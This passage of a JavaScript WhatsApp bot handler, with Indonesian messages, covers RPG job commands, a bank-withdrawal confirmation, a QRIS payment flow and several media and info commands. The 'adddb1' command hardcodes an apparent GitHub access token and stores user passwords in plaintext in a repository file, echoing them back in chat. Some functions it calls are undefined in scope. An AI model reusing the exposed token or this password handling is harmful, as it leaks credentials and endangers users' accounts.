    rpg.exp += randomExp;
    rpg.lastKurir = now;

    let hasilTxt = `
🚲 *Pekerjaan Kurir Selesai!*
━━━━━━━━━━━━━━━━━
💵 *Gaji Diterima:* +${randomMoney.toLocaleString()} uang  
🎯 *Pengalaman:* +${randomExp.toLocaleString()} exp  
━━━━━━━━━━━━━━━━━
🔥 Teruslah bekerja keras dan kumpulkan lebih banyak uang!
`.trim();

    let imageUrl = "https://files.catbox.moe/ednqls.jpg";

    gisnaxd.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: hasilTxt,
        footer: "Rpg Made In QoupayBotz",
        buttons: [
            {
                buttonId: ".menu",
                buttonText: { displayText: "Back To Menu" }
            }
        ],
        viewOnce: true,
        headerType: 4
    }, { quoted: m });

    break;
}

case "nelayan": {
    const fs = require("fs");

    // Fungsi untuk membaca database dari db.json
    function readDB() {
        try {
            let data = fs.readFileSync("./library/database/db.json", "utf8");
            return JSON.parse(data);
        } catch (err) {
            return { user: {} }; // Jika file tidak ada atau error, buat objek default
        }
    }

    // Fungsi untuk menulis database ke db.json
    function writeDB(data) {
        fs.writeFileSync("./library/database/db.json", JSON.stringify(data, null, 2));
    }

    let dbData = readDB();
    let sender = m.sender;

    // Pastikan data user ada
    if (!dbData.user[sender]) {
        dbData.user[sender] = { rpg: { money: 0, exp: 0, lastTaxy: 0 } };
    }

    let usr = dbData.user[sender];
    let rpg = usr.rpg;
    let lastNelayan = rpg.lastNelayan || 0;
    let now = Date.now();
    let cooldown = 14400000;

    if (now - lastNelayan < cooldown) {
        let timeLeft = Math.ceil((cooldown - (now - lastNelayan)) / 1000);
        return gisnaxd.sendMessage(m.chat, { text: `Tunggu ${timeLeft} detik sebelum bisa memancing lagi.` }, { quoted: m });
    }

    let prosesNelayan = [
        "🎣 Mempersiapkan pancing dan umpan...",
        "🌊 Melempar pancing ke laut...",
        "🐟 Menunggu ikan menggigit...",
        "🐠 Berhasil menangkap ikan dan menjualnya!"
    ];

    for (let txt of prosesNelayan) {
        await gisnaxd.sendMessage(m.chat, { text: txt }, { quoted: m });
        await sleep(5000);
    }

    let randomMoney = Math.floor(Math.random() * (600000 - 150000 + 1)) + 150000;
    let randomExp = Math.floor(Math.random() * 50000) + 1;

    rpg.money += randomMoney;
    rpg.exp += randomExp;
    rpg.lastNelayan = now;

    let hasilTxt = `
🎣 *Pekerjaan Nelayan Selesai!*
━━━━━━━━━━━━━━━━━
💵 *Gaji Diterima:* +${randomMoney.toLocaleString()} uang  
🎯 *Pengalaman:* +${randomExp.toLocaleString()} exp  
━━━━━━━━━━━━━━━━━
🐟 Semakin banyak ikan yang ditangkap, semakin banyak uang yang diperoleh!
`.trim();

    let imageUrl = "https://files.catbox.moe/bzq02a.jpg";

    gisnaxd.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: hasilTxt,
        footer: "Rpg Made In QoupayBotz",
        buttons: [
            {
                buttonId: ".menu",
                buttonText: { displayText: "Back To Menu" }
            }
        ],
        viewOnce: true,
        headerType: 4
    }, { quoted: m });

    break;
}

case "kuli": {
const fs = require("fs");

    // Fungsi untuk membaca database dari db.json
    function readDB() {
        try {
            let data = fs.readFileSync("./library/database/db.json", "utf8");
            return JSON.parse(data);
        } catch (err) {
            return { user: {} }; // Jika file tidak ada atau error, buat objek default
        }
    }

    // Fungsi untuk menulis database ke db.json
    function writeDB(data) {
        fs.writeFileSync("./library/database/db.json", JSON.stringify(data, null, 2));
    }

    let dbData = readDB();
    let sender = m.sender;

    // Pastikan data user ada
    if (!dbData.user[sender]) {
        dbData.user[sender] = { rpg: { money: 0, exp: 0, lastTaxy: 0 } };
    }

    let usr = dbData.user[sender];
    let rpg = usr.rpg;
    let lastKuli = rpg.lastKuli || 0;
    let now = Date.now();
    let cooldown = 14400000;

    if (now - lastKuli < cooldown) {
        let timeLeft = Math.ceil((cooldown - (now - lastKuli)) / 1000);
        return gisnaxd.sendMessage(m.chat, { text: `Tunggu ${timeLeft} detik sebelum bisa bekerja lagi.` }, { quoted: m });
    }

    let prosesKuli = [
        "👷‍♂️ Mengangkat semen dan pasir...",
        "🛠️ Membangun tembok rumah...",
        "🏗️ Memasang atap...",
        "✅ Rumah selesai dibangun, menerima upah!"
    ];

    for (let txt of prosesKuli) {
        await gisnaxd.sendMessage(m.chat, { text: txt }, { quoted: m });
        await sleep(5000);
    }

    let randomMoney = Math.floor(Math.random() * (700000 - 200000 + 1)) + 200000;
    let randomExp = Math.floor(Math.random() * 60000) + 1;

    rpg.money += randomMoney;
    rpg.exp += randomExp;
    rpg.lastKuli = now;

    let hasilTxt = `
👷‍♂️ *Pekerjaan Kuli Bangunan Selesai!*
━━━━━━━━━━━━━━━━━
💵 *Gaji Diterima:* +${randomMoney.toLocaleString()} uang  
🎯 *Pengalaman:* +${randomExp.toLocaleString()} exp  
━━━━━━━━━━━━━━━━━
🏗️ Semakin keras bekerja, semakin besar upah yang didapat!
`.trim();

    let imageUrl = "https://files.catbox.moe/r7g4ze.jpg";

    gisnaxd.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: hasilTxt,
        footer: "Rpg Made In QoupayBotz",
        buttons: [
            {
                buttonId: ".menu",
                buttonText: { displayText: "Back To Menu" }
            }
        ],
        viewOnce: true,
        headerType: 4
    }, { quoted: m });

    break;
}

case "tarikbank": {
  const fs = require("fs");

  // Fungsi membaca database dari db.json
  function readDB() {
    try {
      let data = fs.readFileSync("./library/database/db.json", "utf8");
      return JSON.parse(data);
    } catch (err) {
      return { user: {} }; // Jika error, buat objek default
    }
  }

  // Fungsi menulis database ke db.json
  function writeDB(data) {
    fs.writeFileSync("./library/database/db.json", JSON.stringify(data, null, 2));
  }

  // Fungsi mengambil data user
  function getUser(sender) {
    let dbData = readDB();
    if (!dbData.user[sender]) {
      dbData.user[sender] = { bank: 0, saldo: 0 };
    }
    return dbData.user[sender];
  }

  let dbData = readDB();
  let user = getUser(m.sender);
  let args = m.text.split(" ");
  let jumlah = parseInt(args[1]);

  if (!jumlah || isNaN(jumlah) || jumlah <= 0) {
    let msg = `💰 *Informasi Penarikan*\n\n`;
    msg += `🔹 1.000 saldo bot = 1.000.000 uang RPG 🏦\n`;
    msg += `🔹 Kamu bisa menarik saldo dari bank ke saldo bot\n\n`;
    msg += `📌 *Cara Menarik Saldo:*\n`;
    msg += `Ketik: *.tarik <jumlah>*\n`;
    msg += `Contoh: *.tarik 1000* (Menarik 1.000 saldo bot = 1.000.000 uang RPG)\n\n`;
    msg += `💡 Pastikan kamu punya saldo cukup di bank!`;

    return sendMessage(m.chat, msg, m);
  }

  let konversi = jumlah * 1000; // 1.000 saldo bot = 1.000.000 uang RPG

  if (user.bank < konversi) {
    return sendMessage(m.chat, `❌ Saldo bank tidak cukup! Kamu punya ${user.bank.toLocaleString()} uang RPG.`, m);
  }

  // Simpan data penarikan sementara
  if (!global.tarikPending) global.tarikPending = {};
  global.tarikPending[m.sender] = { jumlah, konversi };

  let msg = `⚠️ *Konfirmasi Penarikan*\n\n`;
  msg += `💰 *Jumlah yang akan ditarik:* ${jumlah.toLocaleString()} saldo bot\n`;
  msg += `🏦 *Saldo yang akan dikurangi:* ${konversi.toLocaleString()} uang RPG\n\n`;
  msg += `Tekan tombol *Konfirmasi* untuk melanjutkan.\n`;
  msg += `Tekan tombol *Batal* untuk membatalkan.`;

  sendMessage(m.chat, {
    text: msg,
    footer: "Qoupay",
    buttons: [
      { buttonId: ".konfirmasi", buttonText: { displayText: "✅ Konfirmasi" }, type: 1 },
      { buttonId: ".bataltarik", buttonText: { displayText: "❌ Batal" }, type: 1 },
    ],
    headerType: 1,
  });

  break;
}

case "konfirmasi": {
  if (!global.tarikPending || !global.tarikPending[m.sender]) {
    return sendMessage(m.chat, "❌ Tidak ada transaksi penarikan yang pending!", m);
  }

  let { jumlah, konversi } = global.tarikPending[m.sender];
  let user = getUser(m.sender);

  if (user.bank < konversi) {
    delete global.tarikPending[m.sender]; // Hapus pending jika saldo berubah
    return sendMessage(m.chat, `❌ Saldo bank tidak cukup! Kamu punya ${user.bank.toLocaleString()} uang RPG.`, m);
  }

  // Proses Penarikan
  user.bank -= konversi;
  user.saldo = (user.saldo || 0) + jumlah;
  saveUser(m.sender, user);

  let msg = `✅ *Penarikan Berhasil!*\n\n`;
  msg += `💰 *Jumlah:* ${jumlah.toLocaleString()} saldo bot\n`;
  msg += `🏦 *Sisa Saldo Bank:* ${user.bank.toLocaleString()} uang RPG\n`;
  msg += `📥 *Saldo Saat Ini:* ${user.saldo.toLocaleString()} saldo bot\n`;

  delete global.tarikPending[m.sender]; // Hapus data setelah transaksi sukses
  sendMessage(m.chat, msg, m);
  break;
}

case "bataltarik": {
  if (!global.tarikPending || !global.tarikPending[m.sender]) {
    return sendMessage(m.chat, "❌ Tidak ada transaksi penarikan yang pending!", m);
  }

  delete global.tarikPending[m.sender]; // Batalkan transaksi
  sendMessage(m.chat, "✅ Penarikan dibatalkan.", m);
  break;
}

///========Fitur-new
case "buyreseller": case "buyresellerpanel": {
  try {
    if (global.linkgrupresellerpanel.length == 0) return m.reply("Maaf grup reseller panel tidak sedang tidak tersedia");
    if (m.isGroup) return m.reply("Pembelian digitalocean hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    let Obj = {};
    Obj.harga = 20000; // harga

    const UrlQr = global.qrisOrderKuota;
    const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
    const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Buy Reseller
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
    `;

    let msgQr = await gisnaxd.sendMessage(m.chat, {
      footer: ` ${botname}`,
      buttons: [
        {
          buttonId: `.batalbeli`,
          buttonText: { displayText: 'Batalkan Pembelian' },
          type: 1
        }
      ],
      headerType: 1,
      viewOnce: true,
      image: { url: get.data.result.qrImageUrl }, 
      caption: teks3,
      contextInfo: {
        mentionedJid: [m.sender]
      },
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr, 
      chat: m.sender,
      idDeposit: get.data.result.transactionId, 
      amount: get.data.result.amount.toString(), 
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount === db.users[m.sender].saweria.amount) {
            await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            delete db.users[m.sender].saweria;
          }
        }, 300000);
      }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
      await sleep(8000);
      const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`);
      const req = resultcek.data;

      if (db.users[m.sender].saweria && req?.amount === db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {
          text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Admin Panel Pterodactyl
          `}, { quoted: db.users[m.sender].saweria.msg });

        let transaksiSukses = {
          id: db.users[m.sender].saweria.idDeposit,
          user: m.sender,
          amount: db.users[m.sender].saweria.amount,
          method: "QRIS"
        };

        await sendPaymentNotificationToOwner(transaksiSukses);
        
        let teks = `*Join Grup Reseller Panel :*\n`;
        teks += `* ${global.linkgrupresellerpanel}\n`;

        await gisnaxd.sendMessage(m.sender, {
          text: teks,
          contextInfo: { isForwarded: true }
        });

        await gisnaxd.sendMessage(m.sender, { delete: msgQr.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    m.reply("❌ Terjadi kesalahan saat memproses pembayaran. Coba lagi nanti.");
  }
  break;
}

//=========SetProduk
case "setproduk": {
    if (!args[0] || !args[1]) return Reply("Format salah! Gunakan: *.setproduk <namaProduk> <on/off>*");
    
    let namaProduk = args[0].toLowerCase();
    let statusBaru = args[1].toLowerCase();

    let pesan = await setStatusProduk(namaProduk, statusBaru);
    Reply(pesan);
}
break;
///=======Kepo aja
case 'animebrat': {
  if (!text) return m.reply('Masukkan teks untuk stiker.');

  try {
      const apiUrl = `https://fastrestapis.fasturl.cloud/maker/animbrat?text=${encodeURIComponent(text)}&position=center&mode=image`;
      let response = await fetch(apiUrl);
      let buffer = await response.arrayBuffer();

      // Konversi ke format webp
      let webpBuffer = await sharp(Buffer.from(buffer))
          .toFormat('webp')
          .toBuffer();

      await gisnaxd.sendMessage(m.chat, { 
          sticker: webpBuffer 
      }, { quoted: m });
  } catch (e) {
      console.error("Error di fitur animebrat:", e);
      m.reply('❌ Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
  }
}
break;

case "whatmusic": {
  const acrcloud = require("acrcloud");

  if (!m.quoted || !/audio/.test(m.quoted.mimetype))
    return m.reply("⚠️ *Oops!* Harap balas pesan audio yang ingin dicari judul lagunya.");

  let buffer = await m.quoted.download();
  let data = await whatmusic(buffer);

  if (!data || data.length === 0)
    return m.reply("❌ *Maaf!* Tidak dapat menemukan informasi lagu dari audio tersebut.");

  let caption = `🎵 *What Music - Finder* 🎵\n\n`;
  for (let result of data) {
    caption += `🎶 *Judul:* ${result.title}\n`;
    caption += `🎤 *Artis:* ${result.artist}\n`;
    caption += `⏱️ *Durasi:* ${result.duration}\n`;
    caption += `🔗 *Sumber:* ${result.url.filter((x) => x).join("\n") || "Tidak ditemukan"}\n\n`;
  }

  caption += `💡 *Tips:* Kirim audio dengan kualitas yang jelas untuk hasil terbaik.`;
  m.reply(caption);
}
break;

case "sokuja": {
  let latest = await Sokuja.latest();
  let cap = `*– 乂 Cara penggunaan*
> Masukan query untuk mencari anime
> Masukan link untuk mendapatkan data anime

*– 乂 Contoh - penggunaan*
> ${prefix + command} oshi no ko
> ${prefix + command} https://x1.sokuja.uk/anime/oshi-no-ko-subtitle-indonesia/
> ${prefix + command} https://x1.sokuja.uk/end-oshi-no-ko-episode-11-subtitle-indonesia/

*– 乂 Berikut ${latest.length} anime yang rilis hari ini*

${latest.map((a) => `> *- ${a.title}*
> Episode: ${a.episode}
> Type: ${a.type}
> [Link](${a.url})`).join("\n\n")}`;

  if (!text) return m.reply(cap);

  if (Func.isUrl(text) && /sokuja./.test(text)) {
    if (/anime\//.test(text)) {
      let data = await Sokuja.detail(text);
      let cap = `*– 乂 Sokuja - Detail*
`;
      cap += Object.entries(data.metadata).map(([a, b]) => `> *- ${a.replace(/_/g, " ").toUpperCase()} :* ${b}`).join("\n");
      cap += "\n\n*– 乂 List - Episode*\n";
      cap += data.episode.map((a, i) => `*${i + 1}.* ${a.title}\n> ${a.url}`).join("\n\n");
      return m.reply({ image: { url: data.metadata.thumbnail }, caption: cap });
    } else {
      let data = await Sokuja.episode(text);
      let cap = `*– 乂 Sokuja - Episode*
`;
      cap += Object.entries(data.metadata).map(([a, b]) => `> *- ${a.toUpperCase()} :* ${b}`).join("\n");
      let quality = Object.keys(data.downloads);
      if (quality.length > 0) {
        cap += "\n\n*– 乂 Download - Episode*\n";
        for (let i of quality) {
          cap += `> *- Download ${i}*
`;
          cap += `> [Link](${data.downloads[i].url})\n\n`;
        }
      } else {
        cap += "\n\nTidak ada link download pada episode ini";
      }
      return m.reply(cap);
    }
  } else {
    let data = await Sokuja.search(text);
    if (data.length === 0) return m.reply("> Anime tidak ditemukan");
    let cap = "*– 乂 Sokuja - Search*\n";
    cap += data.map((a) => `> *- ${a.title}*
> Type: ${a.type}
> Status: ${a.status}
> [Link](${a.url})`).join("\n\n");
    return m.reply(cap);
  }
}
break;

case "jadwalsholat": {
            const axios = require('axios');
            const cheerio = require('cheerio');
            if (!text) return m.reply("> 📍 Masukkan nama kota yang kamu tuju!");
            const kota = text?.toLowerCase() || 'jakarta';

            try {
                const {
                    data
                } = await axios.get(`https://jadwal-sholat.tirto.id/kota-${kota}`);
                const $ = cheerio.load(data);

                const jadwal = $('tr.currDate td').map((i, el) => $(el).text()).get();

                if (jadwal.length === 7) {
                    const [tanggal, subuh, duha, dzuhur, ashar, maghrib, isya] = jadwal;

                    const zan = `
╭──[ *📅 Jadwal Sholat* ]──✧
᎒⊸ *🌆 Kota*: ${kota.charAt(0).toUpperCase() + kota.slice(1)}
᎒⊸ *📅 Tanggal*: ${tanggal}

╭──[ *🕰️ Waktu Sholat* ]──✧
᎒⊸ *Subuh:* ${subuh}
᎒⊸ *Duha:* ${duha}
᎒⊸ *Dzuhur:* ${dzuhur}
᎒⊸ *Ashar:* ${ashar}
᎒⊸ *Maghrib:* ${maghrib}
᎒⊸ *Isya:* ${isya}
╰────────────•`;

                    await m.reply(zan);
                } else {
                    await m.reply('❌ Jadwal sholat tidak ditemukan. Pastikan nama kota sesuai.');
                }
            } catch (error) {
                await m.reply('❌ Terjadi kesalahan saat mengambil data!');
            }
        }
        break;
        
case "waifu": {
  try {
    let json = await axios.get("https://api.waifu.pics/sfw/waifu");
    let cap = `*– 乂 Waifu Random:*\n> 💫 *Gambar Waifu yang Baru* \n> *Ketik ${prefix + command} lagi untuk mendapatkan gambar baru!*`;

    await gisnaxd.sendMessage(m.chat, {
      image: { url: json.data.url },
      caption: cap,
    }, { quoted: m }); // Pastikan pesan dikutip agar interaktif
  } catch (err) {
    m.reply("> ❌ Terjadi kesalahan, coba lagi nanti.");
    console.error("Error di perintah waifu:", err);
  }
}
break;

//=====Fitur Owner & Panther Only
case 'adddb1': {
if (!isCreator && !isPremium2) return m.reply('Miskin banget lu pake Fitur Gw')
 if (!q) return m.reply('❌ Anda harus mengirimkan data dalam format: nomor|nama|password.');

 const [phoneNumber, name, password] = q.split('|').map(item => item.trim()); // Pisahkan input berdasarkan '|'

 if (!phoneNumber || !name || !password) {
 return m.reply('❌ Format tidak valid. Gunakan format: nomor|nama|password.');
 }

 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'ACTVTEAM'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'Hajji'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'user_data.json'; // Path ke file JSON di repositori Anda

 try {
 // Ambil data JSON dari GitHub
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
 const jsonData = await response.json();

 // Validasi apakah struktur data sudah benar
 if (!jsonData || typeof jsonData !== 'object') {
 return m.reply('❌ Struktur data tidak valid.');
 }

 // Cek apakah nomor sudah ada di database
 if (jsonData[phoneNumber]) {
 return m.reply(`❌ Nomor ${phoneNumber} sudah ada di database.`);
 }

 // Tambahkan data baru ke JSON
 jsonData[phoneNumber] = { name, password };

 // Encode data JSON menjadi base64 untuk diupload ke GitHub
 const updatedData = JSON.stringify(jsonData, null, 2); // Format JSON dengan indentation 2 spasi
 const base64Content = Buffer.from(updatedData).toString('base64'); // Encode ke base64

 // Ambil SHA dari file GitHub yang ada
 const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
 const shaData = await shaResponse.json();
 const currentSHA = shaData.sha; // SHA file yang ada

 // Update file di GitHub
 const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
 method: 'PUT',
 headers: {
 'Authorization': `Bearer ${GITHUB_TOKEN}`,
 'Content-Type': 'application/json',
 },
 body: JSON.stringify({
 message: `Menambahkan nomor ${phoneNumber} ke database`,
 content: base64Content,
 sha: currentSHA, // SHA file yang ada
 }),
 });

 const updateResult = await updateResponse.json();

 if (updateResponse.status === 200) {
 return m.reply(`✅ Nomor ${phoneNumber} dengan nama "${name}" dan password "${password}" berhasil ditambahkan ke database.`);
 } else {
 throw new Error(`Error menambahkan data: ${updateResult.message}`);
 }

 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
}
break;
//=====Bagian Akses
case "addseller":
    case "addreseller": {
        if (!isCreator) return Reply(mess.owner);
        if (!text && !m.quoted) return m.reply(example("6285###"));

        const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const input2 = input.split("@")[0];

        if (input2 === global.owner || premium2.includes(input) || input === botNumber)
            return m.reply(`Nomor ${input2} sudah Menjadi Babu Qoupay`);

        // Tambahkan ke database
        premium2.push(input);
        saveDatabase();

        m.reply(`Berhasil Menjadi Babu ⚠️`);
    }
    break;

    case "listress":
    case "listreseller": {
        if (premium2.length < 1) return m.reply("Tidak ada user Babu");

        let teks = `\n *#- List all user Babu Gw*\n`;
        for (let i of premium2) {
            teks += `\n* ${i.split("@")[0]}\n* *Tag :* @${i.split("@")[0]}\n`;
        }

        gisnaxd.sendMessage(m.chat, { text: teks, mentions: premium2 }, { quoted: m });
    }
    break;

    case "delreseller":
    case "delres": {
        if (!isCreator) return Reply(mess.owner);
        if (!m.quoted && !text) return m.reply(example("6285###"));

        const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const input2 = input.split("@")[0];

        if (input2 === global.owner || input === botNumber)
            return m.reply(`Babu Lu Gak Bisa Di Hajar`);

        if (!premium2.includes(input))
            return m.reply(`Nomor ${input2} bukan Babu Gw lgi ah ,Dia Miskin Lagi`);

        // Hapus dari database
        premium2 = premium2.filter((user) => user !== input);
        saveDatabase();

        m.reply(`Berhasil Bl Babu Gw , Udh Miskin`);
    }
    break;
//====Fitur new lagi
case 'logogen': {
  if (!text) {
    return m.reply("Masukkan judul, ide, dan slogan logo. Format: .logogen Judul|Ide|Slogan");
  }

  const [title, idea, slogan] = text.split("|");

  if (!title || !idea || !slogan) {
    return m.reply("Format salah. Gunakan : .logogen Judul|Ide|Slogan\n\n*Example :* .logogen Takashi|imul Impul|Jangan lupa Follow yah");
  }

  try {
    const payload = {
      ai_icon: [333276, 333279],
      height: 300,
      idea: idea,
      industry_index: "N",
      industry_index_id: "",
      pagesize: 4,
      session_id: "",
      slogan: slogan,
      title: title,
      whiteEdge: 80,
      width: 400
    };

    const { data } = await axios.post("https://www.sologo.ai/v1/api/logo/logo_generate", payload);
    
    if (!data.data.logoList || data.data.logoList.length === 0) {
      return m.reply("Gagal Membuat Logo");
    }

    const logoUrls = data.data.logoList.map(logo => logo.logo_thumb);
    
    for (const url of logoUrls) {
      await gisnaxd.sendMessage(m.chat, { image: { url: url } });
    }
  } catch (error) {
    console.error("Error generating logo:", error);
    await m.reply("Failed to Create Logo");
  }
};
break

case "infonegara": case "country": {
    if (!q) return m.reply("Masukkan nama negara! Contoh: .infonegara Vietnam");
    let url = `https://api.siputzx.my.id/api/tools/countryInfo?name=${encodeURIComponent(q)}`;
    try {
        let res = await fetch(url);
        let json = await res.json();
        if (!json.status) return m.reply("Negara tidak ditemukan!");
        let data = json.data;
        let neighbors = data.neighbors.map(n => `- ${n.name} (${n.flag})`).join("\n");
        let replyText = `🌍 *Informasi Negara: ${data.name}*\n\n` +
            `🏛 *Ibukota:* ${data.capital}\n` +
            `📍 *Koordinat:* ${data.coordinates.latitude}, ${data.coordinates.longitude}\n` +
            `🏴 *Bendera:* ${data.flag}\n` +
            `📞 *Kode Telepon:* ${data.phoneCode}\n` +
            `🗺 *Peta:* ${data.googleMapsLink}\n` +
            `🌏 *Benua:* ${data.continent.name} ${data.continent.emoji}\n` +
            `🗣 *Bahasa:* ${data.languages.native.join(", ")}\n` +
            `💰 *Mata Uang:* ${data.currency}\n` +
            `🚗 *Lajur Kendaraan:* ${data.drivingSide}\n` +
            `🌟 *Terkenal Sebagai:* ${data.famousFor}\n` +
            `🏛 *Bentuk Pemerintahan:* ${data.constitutionalForm}\n` +
            `🌐 *Domain Internet:* ${data.internetTLD}\n` +
            `🌍 *Negara Tetangga:*\n${neighbors || "Tidak ada"}\n`;

        gisnaxd.sendMessage(m.chat, { text: replyText }, { quoted: qlist });
    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil data.");
    }
}
break;
    
case 'animebrat-vid': {
    if (!text) return m.reply('Masukkan teks untuk stiker.');
  const axios = require('axios')
  const { createCanvas, loadImage, registerFont } = require('canvas')
  const sharp = require('sharp')
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');
        let outputMp4 = path.join(__dirname, 'session', `output_${Date.now()}.mp4`);
        let outputWebP = path.join(__dirname, 'session', `animated_${Date.now()}.webp`);
        let frameDir = path.join(__dirname, 'session', `frames_${Date.now()}`);

        if (!fs.existsSync(frameDir)) fs.mkdirSync(frameDir);

        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let frames = [];

        for (let i = 1; i <= words.length; i++) {
            let tempText = words.slice(0, i).join(' ');
            let frameCanvas = createCanvas(baseImage.width, baseImage.height);
            let frameCtx = frameCanvas.getContext('2d');

            frameCtx.drawImage(baseImage, 0, 0, frameCanvas.width, frameCanvas.height);
            frameCtx.fillStyle = '#000';
            frameCtx.textAlign = 'center';
            frameCtx.textBaseline = 'middle';
            frameCtx.font = `bold ${fontSize}px EmojiFont`;

            let lines = [];
            let currentLine = '';
            tempText.split(' ').forEach((word) => {
                let testLine = currentLine ? currentLine + ' ' + word : word;
                let testWidth = frameCtx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = word;
                } else {
                    currentLine = testLine;
                }
            });
            lines.push(currentLine);

            let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
            lines.forEach((line, index) => {
                frameCtx.fillText(line, boardX + boardWidth / 2, startY + index * lineHeight);
            });

            let framePath = path.join(frameDir, `frame${i}.png`);
            fs.writeFileSync(framePath, frameCanvas.toBuffer('image/png'));
            frames.push(framePath);
        }

        exec(`ffmpeg -y -framerate 2 -i ${frameDir}/frame%d.png -c:v libx264 -pix_fmt yuv420p ${outputMp4}`, async (err) => {
            if (err) {
                console.error("❌ Error membuat video:", err);
                return m.reply("Terjadi kesalahan saat membuat video animasi.");
            }

            exec(`ffmpeg -i ${outputMp4} -vf "scale=512:512:flags=lanczos,format=rgba" -loop 0 -preset default -an -vsync 0 ${outputWebP}`, async (err) => {
                if (err) {
                    console.error("❌ Error konversi video ke stiker:", err);
                    return m.reply("Terjadi kesalahan saat mengonversi video ke stiker.");
                }

                gisnaxd.sendMessage(m.chat, { sticker: { url: outputWebP } }, { quoted: qlist });

                setTimeout(() => {
                    fs.unlinkSync(imagePath);
                    fs.unlinkSync(outputMp4);
                    fs.unlinkSync(outputWebP);
                    fs.rmSync(frameDir, { recursive: true, force: true });
                }, 5000);
            });
        });

    } catch (e) {
        console.error(e);
        m.reply('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break;
case 'gemini': {
    if (!text && !m.quoted) return m.reply("• *Contoh:* .gemini selamat pagi");
    const { uploadFile } = require('cloudku-uploader');
